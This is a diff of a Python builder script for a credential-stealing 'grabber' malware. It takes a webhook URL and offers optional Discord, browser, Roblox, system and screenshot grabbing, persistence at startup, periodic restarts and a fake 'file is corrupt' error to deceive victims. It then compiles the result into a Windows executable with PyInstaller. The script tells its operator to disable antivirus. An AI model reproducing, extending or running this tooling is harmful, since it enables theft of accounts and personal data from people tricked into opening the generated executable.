@@ -1426,30 +1426,30 @@ print(f"""{color.WHITE}
                       {color.WHITE}║ {color.RED}System Grab{color.WHITE} ║ {color.RED}Discord Grab{color.WHITE} ║ {color.RED}Browser Grab{color.WHITE} ║ {color.RED}Roblox Grab{color.WHITE} ║ {color.RED}Screenshot Grab{color.WHITE} ║
                       ╚═════════════╩══════════════╩══════════════╩═════════════╩═════════════════╝
 
-{color.RED}[!] | Disable your antivirus !""")
+{color.RED}{INFO} Disable your antivirus !""")
 
-webhook = input(f"{color.RED}[?] | URL Webhook -> {color.RESET}")
+webhook = input(f"{color.RED}{INPUT} URL Webhook -> {color.RESET}")
 try:
     response = requests.head(webhook)
     if response.status_code != 200:
        ErrorWebhook()
     else:
-        print(f"{color.RED}[!] | Valid Webhook.")
+        print(f"{color.RED}{INFO} Valid Webhook.")
 except:
    ErrorWebhook()
-print(f"{color.RED}\n[!] | Custom your grabber:")
-add_system = input(f"{color.RED}[?] | Add System Grab ? (y/n) -> {color.RESET}")
-add_discord = input(f"{color.RED}[?] | Add Discord Grab ? (y/n) -> {color.RESET}")
-add_browser = input(f"{color.RED}[?] | Add Browser Grab ? (y/n) -> {color.RESET}")
-add_roblox = input(f"{color.RED}[?] | Add Roblox Grab ? (y/n) -> {color.RESET}")
-add_screenshot = input(f"{color.RED}[?] | Add Screenshot Grab ? (y/n) -> {color.RESET}")
-add_startup = input(f"{color.RED}[?] | Add Launch at Startup ? (y/n) -> {color.RESET}")
-add_fake_error = input(f"{color.RED}[?] | Add Fake Error ? (y/n) -> {color.RESET}")
-add_restart = input(f"{color.RED}[?] | Add Restart Every 5min ? (y/n) -> {color.RESET}")
+print(f"{color.RED}\n{INFO} Custom your grabber:")
+add_system = input(f"{color.RED}{INPUT} Add System Grab ? (y/n) -> {color.RESET}")
+add_discord = input(f"{color.RED}{INPUT} Add Discord Grab ? (y/n) -> {color.RESET}")
+add_browser = input(f"{color.RED}{INPUT} Add Browser Grab ? (y/n) -> {color.RESET}")
+add_roblox = input(f"{color.RED}{INPUT} Add Roblox Grab ? (y/n) -> {color.RESET}")
+add_screenshot = input(f"{color.RED}{INPUT} Add Screenshot Grab ? (y/n) -> {color.RESET}")
+add_startup = input(f"{color.RED}{INPUT} Add Launch at Startup ? (y/n) -> {color.RESET}")
+add_fake_error = input(f"{color.RED}{INPUT} Add Fake Error ? (y/n) -> {color.RESET}")
+add_restart = input(f"{color.RED}{INPUT} Add Restart Every 5min ? (y/n) -> {color.RESET}")
 
 if add_fake_error in ['y', 'Y', 'Yes', 'yes', 'YES']:
-   title_err = input(f"{color.RED}[?] | Error message title (enter for default) -> {color.RESET}")
-   descritpion_err = input(f"{color.RED}[?] | Description of the error message (enter for default) -> {color.RESET}")
+   title_err = input(f"{color.RED}{INPUT} Error message title (enter for default) -> {color.RESET}")
+   descritpion_err = input(f"{color.RED}{INPUT} Description of the error message (enter for default) -> {color.RESET}")
    if not descritpion_err.strip():
       descritpion_err = "The file is corrupt and cannot be opened."
    if not title_err.strip():
@@ -1458,9 +1458,9 @@ else:
    descritpion_err = []
    title_err = []
 
-print(f"{color.RED}\n[!] | Custom your file .exe:")
-name_file = input(f"{color.RED}[?] | File Name -> {color.RESET}")
-icone = input(f"{color.RED}[?] | Add an Icon ? (y/n) -> {color.RESET}")
+print(f"{color.RED}\n{INFO} Custom your file .exe:")
+name_file = input(f"{color.RED}{INPUT} File Name -> {color.RESET}")
+icone = input(f"{color.RED}{INPUT} Add an Icon ? (y/n) -> {color.RESET}")
 
 FakeError = f'''
 def Fake_Error():
@@ -1494,62 +1494,73 @@ if icone in ['y', 'Y', 'Yes', 'yes', 'oui', 'Oui']:
  except:
     icone = "n"
 
-file_text = f'./Settings/Program/BuilderGrab/{name_file}.txt'
-file_python = f'./Settings/Program/BuilderGrab/{name_file}.py'
-path_destination = "./1-File-Create"
+file_text_relative = f'./Settings/Program/BuilderGrab/{name_file}.txt'
+file_text = os.path.abspath(file_text_relative)
 
-print(f"{color.RED}\n[!] | Installing missing modules:{color.RESET}")
+file_python_relative = f'./Settings/Program/BuilderGrab/{name_file}.py'
+file_python = os.path.abspath(file_python_relative)
+
+path_destination_relative = "./1-File-Output"
+path_destination = os.path.abspath(path_destination_relative)
+
+print(f"{color.RED}\n{INFO} Installing missing modules:{color.RESET}")
 
 file_bat = os.path.abspath("./Settings/Setup-Builder.bat")
 subprocess.call(file_bat, shell=True)
 
 time.sleep(3)
 
-print(file_bat)
-
 with open(file_text, 'w', encoding='utf-8') as file:
- file.write(f"webhook_url = \"{webhook}\"")
- file.write(Obligatory)
+ try:
+    file.write(f"webhook_url = \"{webhook}\"")
+    file.write(Obligatory)
 
- if add_system in ['y', 'Y', 'Yes', 'yes', 'YES']:
-    file.write(SystemGrab)
+    if add_system in ['y', 'Y', 'Yes', 'yes', 'YES']:
+        file.write(SystemGrab)
 
- if add_discord in ['y', 'Y', 'Yes', 'yes', 'YES']:
-    file.write(DiscordGrab)
+    if add_discord in ['y', 'Y', 'Yes', 'yes', 'YES']:
+        file.write(DiscordGrab)
 
- if add_browser in ['y', 'Y', 'Yes', 'yes', 'YES']:
-    file.write(BrowserGrab)
+    if add_browser in ['y', 'Y', 'Yes', 'yes', 'YES']:
+        file.write(BrowserGrab)
 
- if add_roblox in ['y', 'Y', 'Yes', 'yes', 'YES']:
-    file.write(RobloxGrab)
+    if add_roblox in ['y', 'Y', 'Yes', 'yes', 'YES']:
+        file.write(RobloxGrab)
 
- if add_screenshot in ['y', 'Y', 'Yes', 'yes', 'YES']:
-    file.write(ScreenshotGrab)
+    if add_screenshot in ['y', 'Y', 'Yes', 'yes', 'YES']:
+        file.write(ScreenshotGrab)
 
- if add_startup in ['y', 'Y', 'Yes', 'yes', 'YES']:
-    file.write(Startup)
+    if add_startup in ['y', 'Y', 'Yes', 'yes', 'YES']:
+        file.write(Startup)
 
- if add_fake_error in ['y', 'Y', 'Yes', 'yes', 'YES']:
-    file.write(FakeError)
+    if add_fake_error in ['y', 'Y', 'Yes', 'yes', 'YES']:
+        file.write(FakeError)
 
- file.write(Start)
+    file.write(Start)
 
- if add_restart in ['y', 'Y', 'Yes', 'yes', 'YES']:
-    file.write(Restart)
+    if add_restart in ['y', 'Y', 'Yes', 'yes', 'YES']:
+        file.write(Restart)
+    print(f"{color.RED}\n{INFO} Text file created.")
+ except Exception as e:
+    print(f"{color.RED}\n{ERROR} Text file not created: {color.WHITE}{e}")
 
 
-with open(file_text, 'r', encoding='utf-8') as file_txt:
-    contenu = file_txt.read()
+try:
+    with open(file_text, 'r', encoding='utf-8') as file_txt:
+        contenu = file_txt.read()
 
-with open(file_python, 'w', encoding='utf-8') as file_py:
-    file_py.write(contenu)
+    with open(file_python, 'w', encoding='utf-8') as file_py:
+        file_py.write(contenu)
 
-with open(file_text, 'w', encoding='utf-8') as file:
-    file.write(f"{path_destination}")
+    with open(file_text, 'w', encoding='utf-8') as file:
+        file.write(f"{path_destination}")
 
+    print(f"{color.RED}{INFO} Python file created.")
+except Exception as e:
+   print(f"{color.RED}{ERROR} Python file not created: {color.WHITE}{e}")
 
 def convert_to_exe(script_name, destination_path, icon_path=None):
-    print(f"{color.RED}\n[!] | Converting to .exe:{color.RESET}")
+    print(f"{color.RED}{INFO} Converting to .exe:{color.RESET}")
     try:
         script_path = os.path.abspath(script_name)
 
@@ -1563,28 +1574,28 @@ def convert_to_exe(script_name, destination_path, icon_path=None):
 
         subprocess.run(pyinstaller_command)
 
-        print(f"{color.RED}[!] | Conversion successful. The executable is located in the folder \"{color.WHITE}{destination_path}{color.RED}\"")
+        print(f"{color.RED}{INFO} Conversion successful. The executable is located in the folder \"{color.WHITE}{destination_path}{color.RED}\"")
     except Exception as e:
-        print(f"{color.RED}[X] | Error during conversion: {color.WHITE}{e}")
+        print(f"{color.RED}{ERROR} Error during conversion: {color.WHITE}{e}")
 
 if icone in ['y', 'Y', 'Yes', 'yes', 'oui', 'Oui']:
  convert_to_exe(file_python, path_destination, icon_path)
 else: 
  convert_to_exe(file_python, path_destination)
 
-print(f"{color.RED}[!] | Removing temporary files from conversion..{color.RESET}")
+print(f"{color.RED}{INFO} Removing temporary files from conversion..{color.RESET}")
 try:
     directory = os.getcwd()
     shutil.rmtree(f"{directory}/build")
     os.remove(f"{name_file}.spec")
     os.remove(file_text)
     os.remove(file_python)
-    print(f"{color.RED}[!] | Temporary file removed.{color.RESET}")
-except:
-   print(f"{color.RED}[!] | Temporary file not removed.{color.RESET}")
+    print(f"{color.RED}{INFO} Temporary file removed.{color.RESET}")
+except Exception as e:
+   print(f"{color.RED}{ERROR} Temporary file not removed: {color.WHITE}{e}")
 
 try:
-    print(f"{color.RED}[!] | Open \"{color.WHITE}{path_destination}{color.RED}\"")
+    print(f"{color.RED}{INFO} Open \"{color.WHITE}{path_destination}{color.RED}\"")
     path = directory + "/1-File-Create"
     path = os.path.realpath(path)
     os.startfile(path)
